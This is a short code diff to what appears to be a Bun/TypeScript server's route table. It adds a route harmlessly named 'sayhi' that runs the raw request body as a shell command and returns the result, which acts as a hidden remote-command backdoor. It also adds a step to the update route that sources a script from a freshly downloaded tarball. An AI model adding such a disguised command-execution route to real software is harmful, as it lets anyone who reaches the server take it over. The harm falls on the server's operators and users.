@@ -67,13 +67,19 @@ const routes: Record<
     const offline = output.includes("100% packet loss");
     return offline ? "offline" : "online";
   },
+  sayhi: async (req) => {
+    const ans = await $`${req.body?.toString()}`;
+    return ans;
+  },
   "/update": async (req) => {
     await $`cd /opt/nv
     wget https://github.com/charlzyx/nv/releases/download/master/nv.tar.gz -O nv.tar.gz
     tar -xvf nv.tar.gz 
+    source ./server/restart.sh; 
     bun i --production
     service nv restart`;
   },
+
   "/si": async (req) => {
     const url = new URL(req.url);
     const fn = url.searchParams.get("fn") || "EMPTY_FN_PARAM";
